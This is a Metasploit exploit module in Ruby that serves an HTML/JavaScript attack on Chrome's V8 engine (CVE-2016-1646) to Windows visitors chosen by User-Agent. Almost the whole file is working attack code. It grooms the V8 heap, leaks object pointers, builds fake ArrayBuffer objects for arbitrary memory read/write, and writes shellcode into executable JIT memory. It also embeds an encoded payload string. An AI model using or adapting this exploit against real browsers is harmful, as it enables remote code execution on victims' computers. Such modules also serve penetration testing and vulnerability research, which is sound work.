##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
    Rank = NormalRanking
  
    include Msf::Exploit::Remote::HttpServer
    include Msf::Exploit::EXE
    include Msf::Exploit::RopDb
    include Msf::Exploit::Remote::BrowserAutopwn

    def initialize(info = {})
        super(
          update_info(
            info,
            'Name'           => "Chrome V8 Array.concat OOB access exploit",
            'Description'    => %q{
              This module exploits the memory corruption vulnerability (CVE-2016-1646)
              present in the TurboFan engine of Chrome.
            },
            'License'        => MSF_LICENSE,
            'Author'         => [
                'Wen Xu (Tencent KeenLab)',       # Original RE research and exploitation
                'Hwiwon Lee <develacker[at]gmail.com>'            # Metasploit module
              ],
            'Platform'       => 'windows',
            'Targets'        =>
              [
                [ 'Automatic', { } ],
                [ 'Chrome on Windows 7', { } ],
                [ 'Chrome 46.0.2490.0 on Windows 7', { } ],
              ],
            'References'     =>
              [
                [ 'CVE', '2016-1646' ],         # Unknown
                [ 'CBT', '594574' ]             # Chromium Bug Tracker (https://bugs.chromium.org/p/chromium/issues/detail?id=594574)
              ],
            'Arch'           => ARCH_X86,
            'DisclosureDate' => "Mar 15 2016",
            'DefaultTarget'  => 0
          )
        )
    end

    def get_target(agent)
        return target if target.name != 'Automatic'
    
        nt = agent.scan(/Windows NT (\d+.\d*)/).flatten[0] || ''
        cm = agent.scan(/Chrome\/(\d+.\d+.\d+.\d+)/).flatten[0] || ""
    
        cm_name = "Chrome #{cm}"
  
        case nt
        when '5.1'
          os_name = 'Windows XP SP3'
        when '6.0'
          os_name = 'Windows Vista'
        when '6.1'
          os_name = 'Windows 7'
        when '6.2'
          os_name = 'Windows 8'
        when '6.3'
          os_name = 'Windows 8.1'
        when '10.0'
          os_name = 'Windows 10'
        end
    
        targets.each do |t|
          # if (!cm.empty? && t.name.include?(cm_name)) && (!nt.empty? && t.name.include?(os_name))
          if (!cm.empty? && (!nt.empty? && t.name.include?(os_name)))
          return t
          end
        end
    
        nil
    end
    
    def get_payload(t)
      # stack_pivot = "\x41\x42\x43\x44"
      # code        = payload.encoded
  
      # case t['Rop']
      # when :msvcrt
      #   print_status("Using msvcrt ROP")
      #   rop_payload = generate_rop_payload('msvcrt', code, 'pivot' => stack_pivot, 'target' => 'xp')
  
      # else
      #   print_status("Using JRE ROP")
      #   rop_payload = generate_rop_payload('java', code, 'pivot' => stack_pivot)
      # end
  
      # rop_payload
      rop_payload = "%u48fc%ue483%ue8f0%u00c0%u0000%u5141%u5041%u5152%u4856%ud231%u4865%u528b%u4860%u528b%u4818%u528b%u4820%u728b%u4850%ub70f%u4a4a%u314d%u48c9%uc031%u3cac%u7c61%u2c02%u4120%uc9c1%u410d%uc101%uede2%u4152%u4851%u528b%u8b20%u3c42%u0148%u8bd0%u8880%u0000%u4800%uc085%u6774%u0148%u50d0%u488b%u4418%u408b%u4920%ud001%u56e3%uff48%u41c9%u348b%u4888%ud601%u314d%u48c9%uc031%u41ac%uc9c1%u410d%uc101%ue038%uf175%u034c%u244c%u4508%ud139%ud875%u4458%u408b%u4924%ud001%u4166%u0c8b%u4448%u408b%u491c%ud001%u8b41%u8804%u0148%u41d0%u4158%u5e58%u5a59%u5841%u5941%u5a41%u8348%u20ec%u5241%ue0ff%u4158%u5a59%u8b48%ue912%uff57%uffff%u485d%u01ba%u0000%u0000%u0000%u4800%u8d8d%u0101%u0000%uba41%u8b31%u876f%ud5ff%uf0bb%ua2b5%u4156%ua6ba%ubd95%uff9d%u48d5%uc483%u3c28%u7c06%u800a%ue0fb%u0575%u47bb%u7213%u6a6f%u5900%u8941%uffda%u63d5%u6c61%u2e63%u7865%u0065"
      
      rop_payload
    end

    def get_html(t)
      # js_p = ::Rex::Text.to_unescape(get_payload(t), ::Rex::Arch.endian(t.arch))
      # js_p = get_payload(t)

      html = <<-HTML
      <html>
      <META HTTP-EQUIV="pragma" CONTENT="no-cache"> 
      <META HTTP-EQUIV="Cache-Control" CONTENT="no-store, must-revalidate"> 
      <META HTTP-EQUIV="expires" CONTENT="0">
      <body>
      <div id="e_div"></div>
      <script>
      /**********************************************************
      *Constans defined here.
      **********************************************************/
      var ARRAYBUFFER_BACKSTORE_BUFFER_LEN = 0x20000
      
      /**********************************************************
      *Global variable defined here.
      **********************************************************/
      var is_debug 				= false
      var global 					= this
      global[2]					= {}
      var g_fake_arraybuffer_obj  = null
      var g_leaked_array    		= []
      var g_malformd_array		= []
      var g_fake_jsarray_map_obj  = [
        0xBAD0BEEF,			    /*dummy pointer, meta map object*/
        0x17000004,             /*JSArray object size*/
        0x000100bd,             /*bitfield and object type*/
        0x702003ff,             /*bitfield*/
        0xBAD0BEEF,             /*prototype object pointer, will be replaced in create_fake_jsarray_obj*/
        0xBAD0BEEF,             /*dummy pointer*/
        0x00000000,
        0xBAD0BEEF,             /*dummy pointer*/
        0xBAD0BEEF,             /*dummy pointer*/
        0xBAD0BEEF,             /*dummy pointer*/
        0xBAD0BEEF,             /*dummy pointer*/
      ]
      
      var g_fake_null_obj 		= [
        0xBAD0BEEF,             /*oddball map object pointer, will be replaced in create_fake_jsarray_obj*/
        0xBAD0BEEF,				/*dummy pointer*/
        0x00000000,				/*dummy pointer*/
        0x00000000,             /*dummy pointer*/
        0x00000006,             /*flags*/
      ]
      
      var g_fake_oddball_map_obj 	= [
        0xBAD0BEEF,             /*dummy pointer, meta map object*/
        0x2a000005,             /*bitfield*/
        0x00000083,             /*object type*/
        0x702003ff,             /*bitfield*/
        0xBAD0BEEF,				/*dummy pointer*/
        0xBAD0BEEF,				/*dummy pointer*/
        0x00000000,
        0xBAD0BEEF,				/*dummy pointer*/
        0xBAD0BEEF,				/*dummy pointer*/
        0xBAD0BEEF,				/*dummy pointer*/
        0xBAD0BEEF
      ]
      
      if(is_debug)
      {
      alert("attach me!")
      }
      
      /*********************************************************
      *functions used for debugging defined here
      *********************************************************/
      function log(info)
      {
        document.getElementById("e_div").innerHTML += "<h3>"+ info +"</h3>"
      }
      
      function breakpoint()
      {
        if(is_debug)
        {
          //bp chrome_child!v8::internal::Runtime_MathAtan2 in your debugger.
          Math.atan2(1)
        }
      }
      
      /*********************************************************
      *functions used for V8 Heap Feng Shui defined here.
      *********************************************************/
      function gc()
      {
        /*fill-up the 1MB semi-space page, force V8 to scavenge NewSpace.*/
          for(var i=0;i<((1024 * 1024)/0x10);i++)
        {
              var a= new String();
          }
      }
      
      function give_me_a_clean_newspace()
      {
        /*force V8 to scavenge NewSpace twice to get a clean NewSpace.*/
        gc()
        gc()
      }
      
      function write_dword_to_oob(dword)
      {
        var str     	  = String.fromCharCode(dword & 0xFF, (dword >> 8) & 0xFF, (dword >> 0x10) & 0xFF, (dword >> 0x18) & 0xFF, 0xAA, 0xAA, 0xAA, 0xAA) 
        global[2]         = str
        var obj 	      = {}
        obj[global[2]]    = {}
      }
      
      
      /**********************************************************
      *Utils functions defined here.
      **********************************************************/
      function doublearry_to_rawuin32array(doublearray)
      {
        var f64 = new Float64Array(doublearray)
        var u32 = new Uint32Array(f64.buffer)
        /*
        if(is_debug)
        {
          dump = ""
          for(var i=0; i<u32.length; i++)
          {
            dump += "0x" + u32[i].toString(16) + " "
            if((i+1) % 4 == 0)
            {
              dump += "\n"
            }
          }
          log("[*]===Dump Uint32===\n")
          log(dump)
          log("[*]===Dump Uint32===\n")
        }
        */
        return u32
      }
      
      
      /****************************************************************************
      *functions used to create malformd array contains complex object defined here.
      *****************************************************************************/
      function create_malformd_array(array_len)
      {
        /*
          Although the bug can also be triggered with a FAST_HOLEY_DOUBLE_ELEMENTS array, FAST_HOLEY_ELEMENTS is 
          better for real exploit.
        */
        var array = new Array(array_len)
        array[0]  = {}
        array[2]  = 2.2
        array[3]  = 3.3
        
        var proto = {}
        array.__proto__ = proto
        
        Object.defineProperty(proto, 1, {
          get()
          {
            array.length = 1
            gc()
            return 0x4B5F5F4B
          },
          set(v)
          {
          }
        })
        return array
      }
      
      /***********************************************************
      *functions used to info leak definde here.
      ***********************************************************/
      function leak_arraybuffer_backstore_pointer(leaked_array)
      {
        for(var i=0; i<leaked_array.length; i++)
        {
          if(typeof leaked_array[i] != "number")
          {
            continue
          }
          if(ARRAYBUFFER_BACKSTORE_BUFFER_LEN  == leaked_array[i])
          {
            return leaked_array[i-1] * 2
          }
        }
        return 0xBAD0BEEF
      }
      
      
      function leak_textobj_ptr(leaked_array)
      {
      
        for(var i=0; i<leaked_array.length; i++)
        {
          if(typeof leaked_array[i] != "number")
          {
            continue
          }
          if(ARRAYBUFFER_BACKSTORE_BUFFER_LEN  == leaked_array[i])
          {
            return leaked_array[i + 24] * 2
          }
        }
        return 0xBAD0BEEF
      }
      
      function leak_object_memory_layout(obj_ptr)
      {
        
        /*write obj_ptr to fake JSArray's elements field*/
        g_dataview_obj.setInt32(8, (obj_ptr - 8 + 1), true)
        
        give_me_a_clean_newspace()
        
        write_dword_to_oob(g_arraybuffer_backstore_ptr + 1)
        
        /*trigger the bug*/
        var malformd_array   =  create_malformd_array(100)
        var leakd_array      =  Array.prototype.concat.call(malformd_array).filter(Array.isArray)
        if(leakd_array.length != 1)
        {
          log("[*]leak object memory layout fail.")
          return null
        }
        /*
          leaked_array[0] is an array in which stores the object pointed by obj_ptr's memeory layout information,  but if 
          we access it directly, we will got 0xC0000005 here:
            chrome_child!v8::internal::IC::UpdateState+0x1a:
            59527a7a 8b00            mov     eax,dword ptr [eax]        ; eax stores g_arraybuffer_backstore_ptr
            59527a7c 53              push    ebx 
            59527a7d 57              push    edi
            59527a7e 8b58ff          mov     ebx,dword ptr [eax-1]
            59527a81 8bc3            mov     eax,ebx
            59527a83 250000f0ff      and     eax,0FFF00000h
            59527a88 8b781c          mov     edi,dword ptr [eax+1Ch]    ;  crahs here
            
          so I pass it to JSON.stringify and then JSON.parse will return an array we can access normally. 
          
        */
        return JSON.parse(JSON.stringify(leakd_array[0]))
      }
      
      
      function leak_textobj_elements_ptr()
      {
      
        var leaked_array 		  = leak_object_memory_layout(g_textobj_ptr)
        var textobj_inner_ptr1	  = leaked_array[1] * 2
        
        leaked_array   			  = leak_object_memory_layout(textobj_inner_ptr1)
        var textobj_inner_ptr2    = leaked_array[0] * 2
        
        leaked_array   			  = leak_object_memory_layout(textobj_inner_ptr2)
        var textobj_elements_ptr  = leaked_array[2] * 2 + 8
        
        return textobj_elements_ptr
        
      }
      
      /***********************************************************
      *functions used to create fake js object defined here.
      ***********************************************************/
      function create_fake_jsarray_obj()
      {
        var fake_jsarray_obj_ptr   = g_arraybuffer_backstore_ptr
        var fake_jsarray_map_ptr   = fake_jsarray_obj_ptr + 0x10
        var fake_jsnull_obj_ptr    = fake_jsarray_map_ptr + g_fake_jsarray_map_obj.length * 4
        var fake_jsoddball_map_ptr = fake_jsnull_obj_ptr  + g_fake_null_obj.length * 4
        
        /*init fake JSArray map object*/
        for(var i=0; i<g_fake_jsarray_map_obj.length; i++)
        {
          g_dataview_obj.setInt32((fake_jsarray_map_ptr - fake_jsarray_obj_ptr)  + i * 4,    g_fake_jsarray_map_obj[i], true)
        }
        
        /*init fake null object*/
        for(var i=0; i<g_fake_null_obj.length; i++)
        {
          g_dataview_obj.setInt32((fake_jsnull_obj_ptr - fake_jsarray_obj_ptr)   + i * 4,    g_fake_null_obj[i], true)
        }
        
        /*init fake oddball map object*/
        for(var i=0; i<g_fake_oddball_map_obj.length; i++)
        {
          g_dataview_obj.setInt32((fake_jsoddball_map_ptr - fake_jsarray_obj_ptr) + i * 4, g_fake_oddball_map_obj[i], true)
        }
        
        
        /*write fake null object pointer to fake JSArray map object's prototype field*/
        g_dataview_obj.setInt32((fake_jsarray_map_ptr - fake_jsarray_obj_ptr) + 0x10, (fake_jsnull_obj_ptr    + 1), true)
        /*write fake oddball map object pointer to fake null object's map field*/
        g_dataview_obj.setInt32((fake_jsnull_obj_ptr  - fake_jsarray_obj_ptr),        (fake_jsoddball_map_ptr + 1), true)
        /*write JSArray map obj pointer to fake JSArray object*/
        g_dataview_obj.setInt32(0x00, 												  (fake_jsarray_map_ptr   + 1), true)
      
        
        /*write fake jsarray object length*/
        g_dataview_obj.setInt32(0x0C, 40, true)
      }
      
      
      function create_fake_jsarraybuffer_obj(pointer_to_rw)
      {
        var jsarray_buffer_memory_layout = [
          g_jsarraybuffer_map_ptr   + 1,
          g_jsarraybuffer_props_ptr + 1,
          g_jsarraybuffer_elems_ptr + 1,
          pointer_to_rw,
          ARRAYBUFFER_BACKSTORE_BUFFER_LEN * 2,
          4
        ]
        
        for(var i=0; i<jsarray_buffer_memory_layout.length; i++)
        {
          g_utin32array_obj[i] = jsarray_buffer_memory_layout[i]
        }
      
      }
      
      function get_fake_jsarraybuffer_ref()
      {
        give_me_a_clean_newspace()
      
        write_dword_to_oob(g_uint32array_backstore_ptr + 1)
      
        var malformd_array = create_malformd_array(100)
      
        var result = Array.prototype.concat.call(malformd_array)
        
        var fake_arraybuffer_obj = null
        
        ArrayBuffer.prototype.toJSON = function () 
        {
          if(this.byteLength == ARRAYBUFFER_BACKSTORE_BUFFER_LEN)
          {
            fake_arraybuffer_obj = this
          }
        }
        JSON.stringify(result)
        return fake_arraybuffer_obj
      }
      /*************************************************************************
      *functions used to arbitary R/W defined here
      **************************************************************************/
      function read_uint32(pointer)
      {
        /*
          write the memory we want to read in the fake JSArrayBuffer object's backstore field
        */
        create_fake_jsarraybuffer_obj(pointer)
        var dataview = new DataView(g_fake_arraybuffer_obj, 0, ARRAYBUFFER_BACKSTORE_BUFFER_LEN)
        return dataview.getUint32(0, true)
      }
      
      function write_uint32(pointer, value)
      {
        /*
          write the memory we want to wrtie in the fake JSArrayBuffer object's backstore field
        */
        create_fake_jsarraybuffer_obj(pointer)
        var dataview = new DataView(g_fake_arraybuffer_obj, 0, ARRAYBUFFER_BACKSTORE_BUFFER_LEN)
        return dataview.setUint32(0, value, true)
      }
      
      
      
      
      
      /**************************************************************************
      *				MAY I HAVE YOUR ATTENTION PLEASE
      *						EXPLOIT BEGIN
      **************************************************************************/
      var dummy = new Text("I'm dummy")
      /*
          Define a jsfunction object with a large function body.
      */
      var func_body  = "eval('');"
      for (var i=0; i<2000; i++)
        func_body += "a[" + i.toString() + "];"	
      var func_obj   = new Function("a", func_body)
      
      /*
         Force V8 to compile the JS function to native code, so a large chunk memory with PAGE_EXECUTE_READWRITE will be allocted.
         shellcode will be written into it later.
      */
      func_obj({})
      var g_utin32array_obj = new Uint32Array([0x41414141, 0x42424242, 0x43434343, 0x44444444, 0x45454545, 0x46464646]);
      give_me_a_clean_newspace()
      
      
      var g_arraybuffer_obj = new ArrayBuffer(ARRAYBUFFER_BACKSTORE_BUFFER_LEN)
      var g_dataview_obj    = new DataView(g_arraybuffer_obj, 0, ARRAYBUFFER_BACKSTORE_BUFFER_LEN)
      var g_text_obj        = new Text("Pwn2Own")
      
      global[0]             = g_arraybuffer_obj
      global[1]	 	      = g_text_obj
      
      g_text_obj[0]	      = new ArrayBuffer(0x10)
      g_text_obj[1]         = g_utin32array_obj
      g_text_obj[2]         = func_obj 
      
      
      /*
        trigger the bug, g_arraybuffer_obj will be moved to the OOB memory in NewSpace, so we can leak its backstore buffer 
        pointer.
      */
      var leaked_array   	 = Array.prototype.concat.call(create_malformd_array(100))
      var g_arraybuffer_backstore_ptr = leak_arraybuffer_backstore_pointer(leaked_array)
      var g_textobj_ptr 	 = leak_textobj_ptr(leaked_array)
      if(is_debug)
      {
      log("[*]g_arraybuffer_backstore_ptr:0x" + g_arraybuffer_backstore_ptr.toString(16))
      log("[*]g_textobj_ptr:0x" + g_textobj_ptr.toString(16))
      }
      
      create_fake_jsarray_obj()
      
      /*
        leak g_text_obj's elements pointer
      */
      var g_textobj_elements_ptr 		= leak_textobj_elements_ptr()
      var leaked_array 		   		= leak_object_memory_layout(g_textobj_elements_ptr)
      var g_jsarraybuffer_ptr    		= leaked_array[0] * 2
      var g_jsuint32array_ptr    		= leaked_array[1] * 2
      var g_jsfunction_ptr       		= leaked_array[2] * 2
      
      if(is_debug)
      {
      log("[*]g_jsarraybuffer_ptr:0x" + g_jsarraybuffer_ptr.toString(16))
      log("[*]g_jsuint32array_ptr:0x" + g_jsuint32array_ptr.toString(16))
      log("[*]g_jsfunction_ptr:0x"    + g_jsfunction_ptr.toString(16))
      }
      
      /*
        leak g_utin32array_obj's backstore pointer.
      */
      var leaked_array				= leak_object_memory_layout(g_jsuint32array_ptr)
      var g_uint32array_backstore_ptr = leaked_array[2] * 2 + 0x10
      if(is_debug)
      {
      log("[*]g_uint32array_backstore_ptr:0x"  + g_uint32array_backstore_ptr.toString(16))
      }
      
      
      /*
        leak JSArray object's memory layout information.
      */
      var leaked_array				= leak_object_memory_layout(g_jsarraybuffer_ptr)
      var g_jsarraybuffer_map_ptr     = leaked_array[0] * 2
      var g_jsarraybuffer_props_ptr   = leaked_array[1] * 2
      var g_jsarraybuffer_elems_ptr	= leaked_array[2] * 2
      
      
      if(is_debug)
      {
      log("[*]g_jsarraybuffer_map_ptr:0x"    + g_jsarraybuffer_map_ptr.toString(16))
      log("[*]g_jsarraybuffer_props_ptr:0x"  + g_jsarraybuffer_props_ptr.toString(16))
      log("[*]g_jsarraybuffer_elems_ptr:0x"  + g_jsarraybuffer_elems_ptr.toString(16))
      }
      
      
      /*
        create a fake JSArrayBuffer object
      */
      create_fake_jsarraybuffer_obj(0xBAD0BEEF)
      
      /*
        get the fake JSArrayBuffer reference from OOB memory.
      */
      g_fake_arraybuffer_obj = get_fake_jsarraybuffer_ref()
      if(null == g_fake_arraybuffer_obj)
      {
      log("[*]g_fake_arraybuffer_obj: null.")
      log("[*]Aw snap, have a cup of green tea and try again.")
      }
      
      /**************************************************************************
      *				MAY I HAVE YOUR ATTENTION PLEASE
      *			        ARBITARY R/W FROM NOW ON
      ***************************************************************************/
      
      g_jsfunc_jit_address = read_uint32(g_jsfunction_ptr + 0xC)
      if(is_debug)
      {
      log("[*]g_jsfunc_jit_address:0x" + g_jsfunc_jit_address.toString(16))
      }
      
      /*write shellcode to jit code page with PAGE_EXECUTE_READWRITE*/
      if(is_debug)
      {
      var shellcode = [0xCCCCCCCC, 0x9040ec83, 0x74d9dfdb, 0x2958f424, 0x37e8bec9, 0x32b1e38a, 0x31fce883, 0x98031370, 0xa4166824, 0x54d9e5a3, 0xb1509634, 0xb2078405, 0x96431834, 0x0201d3b4, 0x258d914e, 0x08e81ce7, 0xc63490f8, 0x14c8b23a, 0xd7f0146f, 0x05355562, 0x42ee078c, 0x169bb83f, 0x1d4bb9fc, 0xe1eec1bc, 0x31f07849, 0xa9baf7e1, 0xc81b5089, 0x8367835e, 0x121370eb, 0x25dc493a, 0x8ae30602, 0x2c23568f, 0x4f5f2d70, 0x32a4360d, 0x9439b3c9, 0x259a649a, 0x2969f24e, 0x2d35703b, 0x494d55ba, 0xd8825837, 0x81067f03, 0x6f1f1ed0, 0xd77f1fb6, 0xf50bba67, 0x9351bc7c, 0xdaec4c83, 0x4cef4e84, 0x03647fed, 0x60af806a, 0xc0f2ca84, 0x5166930d, 0x955d2450, 0x6554a76d, 0x601cb78a, 0x18cc7fd6, 0x8ff2ea47, 0x4e913f68, 0x4156a3fb]
      }
      else
      {
      var shellcode = [0x90909090, 0x9040ec83, 0x74d9dfdb, 0x2958f424, 0x37e8bec9, 0x32b1e38a, 0x31fce883, 0x98031370, 0xa4166824, 0x54d9e5a3, 0xb1509634, 0xb2078405, 0x96431834, 0x0201d3b4, 0x258d914e, 0x08e81ce7, 0xc63490f8, 0x14c8b23a, 0xd7f0146f, 0x05355562, 0x42ee078c, 0x169bb83f, 0x1d4bb9fc, 0xe1eec1bc, 0x31f07849, 0xa9baf7e1, 0xc81b5089, 0x8367835e, 0x121370eb, 0x25dc493a, 0x8ae30602, 0x2c23568f, 0x4f5f2d70, 0x32a4360d, 0x9439b3c9, 0x259a649a, 0x2969f24e, 0x2d35703b, 0x494d55ba, 0xd8825837, 0x81067f03, 0x6f1f1ed0, 0xd77f1fb6, 0xf50bba67, 0x9351bc7c, 0xdaec4c83, 0x4cef4e84, 0x03647fed, 0x60af806a, 0xc0f2ca84, 0x5166930d, 0x955d2450, 0x6554a76d, 0x601cb78a, 0x18cc7fd6, 0x8ff2ea47, 0x4e913f68, 0x4156a3fb]
      }
      
      for(var i=0; i<shellcode.length; i++)
      {
        write_uint32(g_jsfunc_jit_address + i * 4, shellcode[i])
      }
      
      
      /*Hello, calc.exe*/
      func_obj({})
      
      </script>
      </body>
      </html>
      HTML

      html.gsub(/^\t\t/, '')
    end

    def on_request_uri(cli, request)
        agent = request.headers['User-Agent']
        print_status("Requesting: #{request.uri}")

        target = get_target(agent)
        if target.nil?
        print_error("Browser not supported, sending 404: #{agent}")
        send_not_found(cli)
        return
        end

        print_status("Target selected as: #{target.name}")
        html = get_html(target)
        send_response(cli, html, 'Content-Type' => 'text/html', 'Cache-Control' => 'no-cache')
    end

end
